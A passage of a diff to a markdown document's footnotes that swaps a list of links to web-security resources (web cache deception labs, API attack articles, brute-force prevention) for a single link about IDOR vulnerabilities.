-    
-[^43]: https://stackoverflow.com/questions/2965746/how-do-you-prevent-brute-force-attacks-on-restful-data-services
-    
-[^44]: https://www.scribd.com/document/845952260/A-Methodology-for-Web-Cache-Deception-Vulnerability-Discovery
-    
-[^45]: https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization
-    
-[^46]: https://www.youtube.com/watch?v=-cwRNObMpVg
-    
-[^47]: https://www.vaadata.com/blog/how-to-strengthen-the-security-of-your-apis-to-counter-the-most-common-attacks/
-    
-[^48]: https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization
-    
-[^49]: https://www.nohat.it/slides/2024/minetti.pdf
-    
-[^50]: https://hackread.com/rising-threat-of-api-attacks-how-to-secure-apis-2025/
-    
-[^51]: https://www.youtube.com/watch?v=e4655fU7yAQ
-    
-[^52]: https://danaepp.com/3-ways-to-use-common-attack-patterns-to-abuse-an-api
+[^6]: https://bigid.com/blog/idor-vulnerability/
